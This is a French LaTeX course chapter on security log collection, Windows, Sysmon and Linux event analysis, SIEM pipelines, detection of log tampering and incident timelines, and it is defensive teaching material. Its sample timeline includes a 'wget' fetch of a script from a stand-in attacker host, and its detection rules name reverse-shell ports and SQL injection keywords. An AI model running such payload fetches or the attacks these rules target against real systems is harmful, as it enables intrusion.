% ==============================================================================
% 02_logs.tex — UE SIS589
% ==============================================================================
\chapter{Journaux d'Événements~: Collecte, Normalisation et Intégrité}
\label{chap:logs}

\epigraph{\itshape « Les logs sont la mémoire du système.
  Celui qui les contrôle contrôle la vérité. »}
         {--- RFC~3227, \textit{Guidelines for Evidence Collection}}

\begin{boxobjectifs}
\begin{enumerate}
  \item Localiser et lire les journaux critiques sur Windows et Linux.
  \item Analyser les Event IDs Windows essentiels à la détection d'intrusions.
  \item Interpréter les formats Apache, Syslog~RFC~5424, pfSense.
  \item Configurer un pipeline de collecte centralisée (Rsyslog + Logstash).
  \item Détecter des marqueurs de manipulation de journaux.
  \item Construire une timeline corrélée multi-sources.
\end{enumerate}
\end{boxobjectifs}

% ==============================================================================
\section{Rôle et criticité des journaux}
\label{sec:logs-role}
% ==============================================================================

Un journal (\textit{log}) est la trace horodatée d'un événement survenu dans
un composant informatique. Il remplit trois fonctions~:

\begin{description}
  \item[Détection.] Alimenter le SIEM pour la corrélation d'alertes en temps réel.
  \item[Investigation.] Permettre la reconstruction chronologique d'une attaque
        \textit{a posteriori}.
  \item[Conformité.] Constituer la preuve documentaire exigée par les référentiels
        (ISO~27001~A.8.15, PCI-DSS~10, RGPD Art.~30, Loi~2010/012~Cameroun).
\end{description}

\begin{boxalert}
\textbf{Principe fondateur d'intégrité.} Un attaquant ayant compromis une
machine peut effacer les journaux locaux pour masquer ses traces (T1070.001).
Seule l'expédition \textbf{immédiate et chiffrée} vers un collecteur distant,
hors de portée de la machine compromise, garantit l'intégrité forensique.
\textbf{Un journal non exporté en temps réel est un journal potentiellement
falsifié.}
\end{boxalert}

% ==============================================================================
\section{Journaux Windows}
\label{sec:logs-windows}
% ==============================================================================

\subsection{Localisation et journaux natifs}

Windows journalise dans des fichiers \texttt{.evtx} accessibles via
l'Observateur d'événements (\texttt{eventvwr.msc}) ou PowerShell.

\begin{table}[H]
\centering\small
\caption{Journaux Windows natifs fondamentaux}
\label{tab:win-journals}
\rowcolors{2}{TableauPair}{TableauImpair}
\begin{tabular}{p{4.5cm}p{4.5cm}p{4.5cm}}
\toprule
\tableauHeader{Journal} & \tableauHeader{Chemin (.evtx)} &
\tableauHeader{Contenu clé} \\
\midrule
Security &
\texttt{System32\textbackslash winevt\textbackslash Logs\textbackslash Security.evtx} &
Authentifications, gestion comptes, politique, audit \\
System &
\texttt{...System.evtx} &
Démarrage, services, drivers, erreurs matérielles \\
Application &
\texttt{...Application.evtx} &
Erreurs applicatives, bases de données \\
PowerShell/Operational &
\texttt{...PowerShell\textbackslash Operational.evtx} &
Exécution et \textbf{contenu} des scripts PS \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Event IDs critiques}

\begin{table}[H]
\centering\small
\caption{Event IDs Windows à surveiller en priorité}
\label{tab:event-ids}
\rowcolors{2}{TableauPair}{TableauImpair}
\begin{tabular}{p{1.4cm}p{5.5cm}p{2.8cm}p{3.5cm}}
\toprule
\tableauHeader{EID} & \tableauHeader{Description} &
\tableauHeader{Journal} & \tableauHeader{Menace (MITRE)} \\
\midrule
\textbf{4624} & Auth. réussie                       & Security & Accès / mouvement latéral \\
\textbf{4625} & Échec d'authentification             & Security & Brute force (T1110) \\
\textbf{4648} & Auth. credentials explicites         & Security & Pass-the-hash, runas \\
\textbf{4672} & Droits spéciaux accordés (SeDebug…) & Security & Élévation de privilèges \\
\textbf{4720} & Création d'un compte utilisateur    & Security & Persistance (T1136) \\
\textbf{4728} & Ajout à un groupe global            & Security & Escalade (T1098) \\
\textbf{4732} & Ajout au groupe Administrators       & Security & \gravite{critique} \\
\textbf{4776} & Validation NTLM (DC)                & Security & Pass-the-hash (T1550.002) \\
\textbf{7045} & Nouveau service installé             & System   & Persistance (T1543.003) \\
\textbf{4698} & Tâche planifiée créée               & Security & Persistance (T1053.005) \\
\textbf{4103} & Contenu bloc de pipeline PS         & PS/Oper. & Exécution offensive \\
\textbf{4104} & Création de script PS (ScriptBlock) & PS/Oper. & T1059.001 \\
\textbf{1102} & Journal Sécurité effacé             & Security & \gravite{critique} Anti-forensics \\
\textbf{4740} & Compte verrouillé                   & Security & Brute force / lockout DoS \\
\bottomrule
\end{tabular}
\end{table}

\begin{boxalert}
\textbf{EID~1102~: signal d'alarme absolu.}
En effaçant le journal de sécurité, l'attaquant génère lui-même cette trace.
Si le SIEM a reçu les événements en temps réel \textbf{avant} l'effacement,
la chronologie reste reconstituable. C'est l'argument opérationnel principal
pour l'exportation continue des logs.
\end{boxalert}

\begin{lstlisting}[style=StyleTerminal,
  caption={Analyse PowerShell --- échecs d'auth et comptes créés},
  label={lst:ps-event}]
# Echecs d'authentification sur 24h, classés par IP source
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'; Id = 4625
    StartTime = (Get-Date).AddHours(-24) } |
  Select-Object TimeCreated,
    @{N='SourceIP';  E={$_.Properties[19].Value}},
    @{N='Username';  E={$_.Properties[5].Value}},
    @{N='LogonType'; E={$_.Properties[10].Value}} |
  Group-Object SourceIP | Sort-Object Count -Desc | Select -First 10

# Comptes créés dans les 7 derniers jours (EID 4720)
Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4720
    StartTime=(Get-Date).AddDays(-7) } |
  Select-Object TimeCreated,
    @{N='NewAccount'; E={$_.Properties[0].Value}},
    @{N='CreatedBy';  E={$_.Properties[4].Value}}
\end{lstlisting}

\subsection{Sysmon~: enrichissement de la télémétrie}

\begin{boxdef}
\textbf{Sysmon (\textit{System Monitor})~:} Service Microsoft Sysinternals
(gratuit) installé en tant que driver Windows, journalisant des événements
à haute valeur forensique absents des journaux natifs~: processus avec
\textbf{ligne de commande complète et hash SHA-256}, connexions réseau par
processus, chargement de DLL, injection mémoire, requêtes DNS.
\end{boxdef}

\begin{table}[H]
\centering\small
\caption{Event IDs Sysmon prioritaires}
\label{tab:sysmon-eids}
\rowcolors{2}{TableauPair}{TableauImpair}
\begin{tabular}{p{1.4cm}p{4.5cm}p{7.5cm}}
\toprule
\tableauHeader{EID} & \tableauHeader{Événement} & \tableauHeader{Valeur de détection} \\
\midrule
1  & Création de processus  & Commande complète, hash, PPID, utilisateur \\
3  & Connexion réseau       & Processus source, IP/port destination \\
7  & Chargement de DLL      & DLL hijacking, injection \\
8  & CreateRemoteThread     & Injection de processus (T1055) \\
11 & Création de fichier    & Dépôt de malware, artefacts \\
13 & Modification registre  & Persistance, clés Run \\
22 & Requête DNS            & DGA, tunneling, C2 (T1568.002) \\
25 & Processus altéré       & Process hollowing (T1055.012) \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[style=StyleCode, language=YAML,
  caption={sysmonconfig.xml minimal --- LiZbiZ-SIS},
  label={lst:sysmon-config}]
<Sysmon schemaversion="4.90">
  <HashAlgorithms>sha256,md5</HashAlgorithms>
  <EventFiltering>
    <!-- EID 1 : exclure processus natifs bruyants -->
    <RuleGroup groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <Image condition="is">C:\Windows\System32\consent.exe</Image>
        <Image condition="is">C:\Windows\System32\audiodg.exe</Image>
      </ProcessCreate>
    </RuleGroup>
    <!-- EID 3 : ne capturer que les interpretes de script -->
    <RuleGroup groupRelation="or">
      <NetworkConnect onmatch="include">
        <Image condition="contains">powershell</Image>
        <Image condition="contains">wscript</Image>
        <Image condition="contains">cscript</Image>
        <Image condition="contains">mshta</Image>
        <DestinationPort condition="is">4444</DestinationPort>
        <DestinationPort condition="is">1337</DestinationPort>
      </NetworkConnect>
    </RuleGroup>
    <!-- EID 8 : injection memoire — tout capturer -->
    <CreateRemoteThread onmatch="exclude" />
    <!-- EID 22 : DNS — exclure domaines Microsoft legitimes -->
    <DnsQuery onmatch="exclude">
      <QueryName condition="end with">.microsoft.com</QueryName>
      <QueryName condition="end with">.windowsupdate.com</QueryName>
      <QueryName condition="end with">.office.com</QueryName>
    </DnsQuery>
  </EventFiltering>
</Sysmon>
\end{lstlisting}

% ==============================================================================
\section{Journaux Linux}
\label{sec:logs-linux}
% ==============================================================================

\subsection{Fichiers critiques}

\begin{table}[H]
\centering\small
\caption{Journaux Linux critiques pour la sécurité}
\label{tab:linux-logs}
\rowcolors{2}{TableauPair}{TableauImpair}
\begin{tabular}{p{5.5cm}p{8cm}}
\toprule
\tableauHeader{Fichier} & \tableauHeader{Contenu et valeur} \\
\midrule
\texttt{/var/log/auth.log}          & Auth. SSH, su, sudo, PAM. \textbf{Source~\#1} \\
\texttt{/var/log/syslog}            & Messages système généraux \\
\texttt{/var/log/kern.log}          & Noyau (rootkits, anomalies mémoire) \\
\texttt{/var/log/apache2/access.log}& Requêtes HTTP (\textit{every request}) \\
\texttt{/var/log/apache2/error.log} & Erreurs (tentatives exploitation) \\
\texttt{/var/log/wtmp}              & Historique connexions (\texttt{last}) \\
\texttt{/var/log/btmp}              & Connexions échouées (\texttt{lastb}) \\
\texttt{/var/log/audit/audit.log}   & Auditd (syscalls, fichiers sensibles) \\
\texttt{\$HOME/.bash\_history}      & Historique commandes (volatile) \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[style=StyleTerminal,
  caption={Analyse rapide d'auth.log --- détection brute force et accès suspects},
  label={lst:linux-auth}]
# Echecs SSH — derniers 100
grep "Failed password" /var/log/auth.log | tail -100

# Top IPs attaquantes
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# Connexions SSH reussies (qui s'est connecte ?)
grep "Accepted" /var/log/auth.log | \
  awk '{print $1,$2,$3,"user:"$9,"from:"$11}'

# Commandes sudo (qui a fait quoi en root ?)
grep "sudo:" /var/log/auth.log | grep "COMMAND" | \
  awk '{print $1,$2,$3,$NF}'

# Sessions actives en ce moment
who ; ss -tnp | grep ESTABLISHED

# Historique connexions 30 jours
last -n 50 | grep -v "^reboot"

# Echecs de connexion (btmp)
lastb | head -30
\end{lstlisting}

\subsection{Format Syslog RFC~5424}

\begin{boxdef}
\textbf{Syslog~:} Protocole standard (RFC~5424) de journalisation pour systèmes
Unix/Linux et équipements réseau. Structure d'un message~:
\texttt{<Priority>Version Timestamp Hostname App-Name ProcID MsgID Message}
\end{boxdef}

\begin{lstlisting}[style=StyleTerminal,
  caption={Anatomie d'un message Syslog RFC~5424},
  label={lst:syslog-format}]
<38>1 2026-04-12T03:14:22.000Z srv-web-01 sshd 1234 - -
  Accepted publickey for ubuntu from 10.0.1.5 port 52341 ssh2

# Décomposition :
# <38>  = Priority = (facility × 8) + severity = (4×8)+6 = 38
#         facility=4 (auth), severity=6 (informational)
# 1     = Version RFC 5424
# 2026-04-12T03:14:22.000Z = Timestamp ISO 8601 UTC obligatoire
# srv-web-01 = Hostname source
# sshd 1234  = Processus + PID
# Accepted publickey... = Message libre

# Niveaux de severite (0 = urgence, 7 = debug)
# 0 emerg  | 1 alert  | 2 crit  | 3 err
# 4 warning| 5 notice | 6 info  | 7 debug
# Le SOC surveille 0-4 ; niveau 6 (info) pour les authentifications
\end{lstlisting}

% ==============================================================================
\section{Journaux applicatifs et réseau}
\label{sec:logs-app}
% ==============================================================================

\subsection{Apache / Nginx}

\begin{lstlisting}[style=StyleTerminal,
  caption={Format Combined Log Apache et analyse sécurité},
  label={lst:apache-log}]
# Format : IP identd user [timestamp] "requete" code taille "referer" "UA"
203.0.113.42 - - [12/Apr/2026:03:14:22 +0000] \
  "POST /wp-login.php HTTP/1.1" 401 1234 \
  "-" "sqlmap/1.7 (https://sqlmap.org)"

# Scanner web : codes 404 en masse par IP
awk '$9==404{print $1}' access.log | sort | uniq -c | sort -rn | head

# Tentatives SQLi (union, select, etc.)
grep -iE "(union.*select|insert.*into|drop.*table|--|/\*|xp_|exec.*xp)" \
  access.log | awk '{print $1,$7}' | head -30

# POST vers .php suspects (webshells)
awk '$6=="\"POST"' access.log | grep "\.php" | \
  awk '{print $7}' | sort | uniq -c | sort -rn

# Volume par code HTTP (tableau de bord rapide)
awk '{print $9}' access.log | sort | uniq -c | sort -rn
\end{lstlisting}

\subsection{Firewall pfSense}

\begin{lstlisting}[style=StyleTerminal,
  caption={Log pfSense --- format CSV via Syslog},
  label={lst:pfsense-log}]
# Exemple d'entrée pfSense (filterlog)
Apr 12 03:14:22 pfSense filterlog: 5,,,1000000003,em0,match,block,in,
  4,0x0,,64,0,0,DF,6,tcp,60,203.0.113.42,10.0.1.10,54321,22,0,S

# Champs clés (séparés par virgule) :
# [6]  em0          = interface
# [7]  block/pass   = action
# [8]  in/out       = direction
# [17] 203.0.113.42 = IP source
# [18] 10.0.1.10    = IP destination
# [19] 54321        = port source
# [20] 22           = port destination
# [NF] S            = TCP flags (SYN, ACK, RST, FIN)

# Ports les plus souvent bloqués (scan de ports entrant)
grep ",block," /var/log/filter.log | \
  awk -F',' '{print $(NF-3)}' | \
  sort | uniq -c | sort -rn | head -20

# IPs bloquées le plus souvent
grep ",block," /var/log/filter.log | \
  awk -F',' '{print $17}' | \
  sort | uniq -c | sort -rn | head -20
\end{lstlisting}

% ==============================================================================
\section{Architecture de collecte centralisée}
\label{sec:collecte-centrale}
% ==============================================================================

\subsection{Composants}

\begin{enumerate}
  \item \textbf{Agents / expéditeurs.} Processus léger installé sur chaque source~:
        Wazuh Agent, Filebeat, NXLog, Fluentd. Transmet en temps réel.
  \item \textbf{Collecteur / broker.} Concentre, normalise, achemine vers le SIEM~:
        Logstash, Rsyslog, Syslog-ng, Kafka (haute disponibilité).
  \item \textbf{SIEM / stockage.} Elasticsearch, Splunk~: indexation, corrélation,
        conservation longue durée.
\end{enumerate}

\begin{lstlisting}[style=StyleCode, language=YAML,
  caption={Rsyslog --- expédition TCP chiffré TLS vers SIEM},
  label={lst:rsyslog-forward}]
# /etc/rsyslog.d/50-siem.conf  (sur chaque serveur Linux)
module(load="imtcp")

# Expedier TOUS les logs vers le SIEM (TCP + TLS + authentification mutuelle)
*.* action(
    type="omfwd"
    target="10.0.0.5"               # IP Wazuh/SIEM
    port="6514"                     # Port TCP avec TLS
    protocol="tcp"
    StreamDriver="gtls"
    StreamDriverMode="1"            # TLS obligatoire
    StreamDriverAuthMode="x509/name"
    StreamDriverPermittedPeers="siem.lizbiz.local"
    queue.type="LinkedList"         # File pour resilience reseau
    queue.size="50000"
    action.resumeRetryCount="-1"    # Retry infini
)
# Conservation locale 30 jours (sauvegarde en cas de coupure reseau)
$outchannel local_siem,/var/log/siem-backup.log,524288000,/bin/true
*.* :omfile:$local_siem
\end{lstlisting}

\begin{lstlisting}[style=StyleCode, language=YAML,
  caption={Pipeline Logstash --- parsing multi-source + enrichissement CTI},
  label={lst:logstash-pipeline}]
# /etc/logstash/conf.d/lizbiz-sis.conf
input {
  beats  { port => 5044 ssl => true ssl_certificate => "/etc/ssl/siem.crt" }
  syslog { port => 514  type => "syslog" }
}

filter {
  # --- Apache access log ---
  if [type] == "apache-access" {
    grok { match => { "message" => "%{COMBINEDAPACHELOG}" } }
    geoip { source => "clientip" }
    useragent { source => "agent" target => "ua" }
  }

  # --- SSH auth events ---
  if [program] == "sshd" {
    grok { match => { "message" => [
      "Accepted %{WORD:auth_method} for %{USER:user} from %{IP:src_ip}",
      "Failed password for %{USER:user} from %{IP:src_ip}"
    ]}}
    mutate { add_field => { "event_category" => "authentication" } }
  }

  # --- Enrichissement CTI : lookup IP dans base IoC MISP/OTX ---
  translate {
    field            => "src_ip"
    destination      => "threat_intel_match"
    dictionary_path  => "/etc/logstash/ioc_ips.csv"
    fallback         => "unknown"
  }

  # --- Normalisation timestamp -> UTC ---
  date { match => ["timestamp", "dd/MMM/yyyy:HH:mm:ss Z"] }

  # --- Tag les evenements enrichis IoC ---
  if [threat_intel_match] != "unknown" {
    mutate { add_tag => ["ioc_match", "requires_triage"] }
  }
}

output {
  elasticsearch {
    hosts    => ["https://10.0.0.5:9200"]
    index    => "lizbiz-logs-%{+YYYY.MM.dd}"
    user     => "logstash_writer"
    password => "${ELASTIC_PASSWORD}"
    ssl      => true
    cacert   => "/etc/ssl/elastic-ca.crt"
  }
  # Alerte temps reel si IoC match
  if "ioc_match" in [tags] {
    email {
      to      => "soc@lizbiz.local"
      subject => "ALERTE IoC --- %{src_ip}"
      body    => "Correspondance CTI sur %{src_ip} dans %{[log][file][path]}"
    }
  }
}
\end{lstlisting}

\subsection{Politique de rétention}

\begin{table}[H]
\centering\small
\caption{Durées de rétention selon les référentiels}
\label{tab:retention}
\rowcolors{2}{TableauPair}{TableauImpair}
\begin{tabular}{p{4cm}p{3.5cm}p{6cm}}
\toprule
\tableauHeader{Référentiel} & \tableauHeader{Durée minimale} &
\tableauHeader{Exigence complémentaire} \\
\midrule
ISO~27001:2022 A.8.15  & Définie par PSSI   & Revue annuelle de la politique \\
PCI-DSS~v4.0 (10.7)    & 12~mois            & 3~mois immédiatement accessibles \\
RGPD (Art.~5)          & Définie par finalité & Minimisation, justification \\
ANSSI PA-022           & 12~mois            & 3~mois à chaud \\
Loi~2010/012 Cameroun  & Non précisée       & Conservation sur demande ANTIC \\
Directive NIS2 (UE)    & 12~mois            & Notification CSIRT sous 24h \\
\bottomrule
\end{tabular}
\end{table}

% ==============================================================================
\section{Détection de manipulation de journaux}
\label{sec:log-tampering}
% ==============================================================================

\begin{boxdef}
\textbf{Log tampering (T1070 MITRE ATT\&CK)~:} Suppression, modification
ou falsification des journaux pour masquer une présence ou des actions.
Tactique~: \textit{Defense Evasion}.
\end{boxdef}

Cinq indicateurs de manipulation~:

\begin{enumerate}
  \item \textbf{Trous temporels.} Absence soudaine de journaux pour une
        période sur une source active (zéro ligne durant une heure sur
        un serveur web générant habituellement $>1000$~requêtes/h).
  \item \textbf{EID~1102 / 104} (Windows)~: effacement du journal de
        sécurité ou du journal système. Alerte de niveau CRITIQUE immédiate.
  \item \textbf{Rupture de séquence.} Les journaux Windows contiennent un
        numéro de séquence incrémental~; une rupture trahit un effacement
        partiel.
  \item \textbf{Incohérence de hachage.} Si le SIEM calcule et stocke un
        SHA-256 pour chaque lot de logs reçu, une divergence révèle une
        altération en transit ou à la source.
  \item \textbf{Timestomping (T1070.006)~:} Modification des horodatages
        MACE (\textit{Modified, Accessed, Created, Entry Modified}) d'un
        fichier pour brouiller la timeline forensique.
\end{enumerate}

\begin{lstlisting}[style=StyleTerminal,
  caption={Détection de trous temporels et d'effacement de journaux},
  label={lst:detect-tampering}]
# ─── Linux : détecter un trou temporel dans access.log ──────────────────────
awk '{print $4}' /var/log/apache2/access.log | \
  cut -d: -f1,2 | sort | uniq -c

# Résultat suspect :
#  1423 [12/Apr/2026:01
#  1687 [12/Apr/2026:02
#     0 [12/Apr/2026:03   <-- ANOMALIE : silence total 1h sur un serveur actif
#  1831 [12/Apr/2026:04

# ─── Windows : détecter l'effacement du journal Sécurité (KQL Kibana) ───────
event.code: "1102" AND winlog.channel: "Security"
# ou
event.code: "104"  AND winlog.channel: "System"

# ─── Windows : vérifier la continuité du numéro de séquence ─────────────────
Get-WinEvent -LogName Security -MaxEvents 1000 |
  Select-Object RecordId, TimeCreated |
  Sort-Object RecordId |
  ForEach-Object {
    if ($prev -and ($_.RecordId - $prev) -gt 1) {
      Write-Warning "RUPTURE entre RecordId $prev et $($_.RecordId)"
    }
    $prev = $_.RecordId
  }

# ─── FIM Wazuh : alerte si auth.log est modifié (tronqué) ───────────────────
# Ajouter dans ossec.conf :
# <directories check_all="yes" report_changes="yes">/var/log/auth.log</directories>
# Wazuh génère une alerte de niveau 7 si la taille du fichier diminue.
\end{lstlisting}

\begin{boxioc}
\textbf{IoC de log tampering à configurer dans le SIEM}
\begin{itemize}
  \item Windows EID~1102~: journal Sécurité effacé → \gravite{critique}, alerte immédiate.
  \item Windows EID~104~: journal Système effacé → \gravite{critique}.
  \item Linux~: taille de \texttt{/var/log/auth.log} qui diminue (FIM Wazuh).
  \item Absence de logs $>5$~min sur une source active connue.
  \item Modification des timestamps MACE sur les fichiers de log (Sysmon EID~11).
\end{itemize}
\end{boxioc}

% ==============================================================================
\section{Construction d'une timeline corrélée}
\label{sec:timeline}
% ==============================================================================

La timeline est la reconstruction chronologique des événements, issue de la
corrélation de sources hétérogènes. Elle constitue le document central de
toute investigation forensique.

\textbf{Méthode en cinq étapes~:}
\begin{enumerate}
  \item Identifier la fenêtre temporelle (premier IoC connu → confinement).
  \item Collecter les sources~: SIEM, firewall, serveurs, EDR, DNS, proxy.
  \item Unifier les timestamps en UTC (documenter les décalages NTP).
  \item Corréler par entité commune~: IP source, compte utilisateur, hostname.
  \item Annoter chaque événement avec le TTP MITRE ATT\&CK correspondant.
\end{enumerate}

\begin{table}[H]
\centering\small
\caption{Extrait de timeline corrélée --- incident LiZbiZ-SIS, 12/04/2026}
\label{tab:timeline}
\rowcolors{2}{TableauPair}{TableauImpair}
\begin{tabular}{p{3.4cm}p{2.3cm}p{2.8cm}p{4.5cm}p{1.5cm}}
\toprule
\tableauHeader{Timestamp UTC} & \tableauHeader{Source} &
\tableauHeader{Entité} & \tableauHeader{Événement} &
\tableauHeader{MITRE} \\
\midrule
\timestamp{2026-04-12 02:47:11} & pfSense & 203.0.113.42 &
Scan SYN port~22, 150~paquets/s & T1595 \\
\timestamp{2026-04-12 03:14:22} & auth.log & 203.0.113.42 &
7~échecs SSH / 45s (root, admin, backup) & T1110.001 \\
\timestamp{2026-04-12 03:14:51} & auth.log & 203.0.113.42 &
Authentification SSH réussie (user: backup) & T1078 \\
\timestamp{2026-04-12 03:17:03} & Sysmon EID~1 & backup@srv-web-01 &
\texttt{wget http://evil.io/lp.sh} exécuté & T1059.004 \\
\timestamp{2026-04-12 03:17:41} & Sysmon EID~3 & srv-web-01 &
Connexion sortante C2 185.220.101.5:443 & T1071.001 \\
\timestamp{2026-04-12 03:21:15} & Security EID~4624 & srv-web-01 &
Mouvement latéral SMB vers srv-erp-01 & T1021.002 \\
\timestamp{2026-04-12 03:48:00} & Security EID~1102 & srv-erp-01 &
Journal de sécurité effacé & T1070.001 \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[style=StyleTerminal,
  caption={Construction de timeline avec Plaso / log2timeline},
  label={lst:log2timeline}]
# Plaso — extraction multi-source vers une super-timeline
pip install plaso --break-system-packages

# Étape 1 : parser toutes les sources dans un fichier .plaso
log2timeline.py \
  --parsers syslog,apache_access,winevtx,winsuperlog,sysmonxml \
  timeline.plaso /evidence/lizbiz-srv-web-01/

# Étape 2 : filtrer sur la fenêtre de l'incident et exporter CSV
psort.py -o l2tcsv \
  -q "date > '2026-04-12 02:00:00' AND date < '2026-04-12 06:00:00'" \
  timeline.plaso > incident_20260412.csv

# Alternative rapide sans Plaso (grep multi-sources)
grep "12/Apr/2026:03:1[0-9]" /var/log/apache2/access.log
grep "Apr 12 03:1[0-9]" /var/log/auth.log
grep "Apr 12 03:1[0-9]" /var/log/syslog
# Trier par timestamp
cat incident_*.log | sort -k1,3 | less
\end{lstlisting}

% ==============================================================================
\section*{Résumé}
% ==============================================================================

\begin{boxresume}
\begin{itemize}
  \item Trois fonctions des logs~: détection, investigation, conformité.
        Exportation en temps réel = intégrité.
  \item Windows~: Security/System/PowerShell/Operational. EIDs critiques~:
        4625, 4672, 4720, 4732, 1102. Sysmon enrichit (EID~1,3,8,22).
  \item Linux~: \texttt{auth.log}, \texttt{syslog}, logs applicatifs.
        Format Syslog RFC~5424 (priority = facility×8 + severity).
  \item Pipeline~: Agent~→~Collecteur (Rsyslog/Logstash)~→~SIEM.
        Transport TLS obligatoire. Rétention minimale~: 12~mois.
  \item Log tampering (T1070)~: détecter par EID~1102, trous temporels,
        ruptures de séquence, FIM Wazuh.
  \item Timeline~: unifier UTC, corréler par entité, annoter MITRE ATT\&CK.
\end{itemize}
\end{boxresume}

\begin{boxexo}
\textbf{Ex.~2.1 — Analyse d'un fichier access.log.}
À partir du fichier fourni en TP, identifiez~: (a)~les IP générant le
plus de codes~401~; (b)~les URI cibles de tentatives SQLi~;
(c)~les User-Agents suspects. Produisez une fiche d'alerte de 10~lignes.

\medskip\textbf{Ex.~2.2 — Configuration Rsyslog.}
Rédigez \texttt{/etc/rsyslog.d/50-siem.conf} pour qu'un Ubuntu~22.04
expédie vers le SIEM (10.0.0.5:6514 TCP TLS) tous les journaux de
niveau \texttt{warning} et supérieur, avec file d'attente persistante
de 10~000~messages.

\medskip\textbf{Ex.~2.3 — Analyse de la timeline.}
À partir du tableau~\ref{tab:timeline}~: (a)~durée entre le premier
scan et la première connexion réussie~; (b)~EID confirmant l'effacement~;
(c)~technique MITRE du mouvement latéral~; (d)~deux mesures qui auraient
interrompu la chaîne dès l'étape 3.
\end{boxexo}
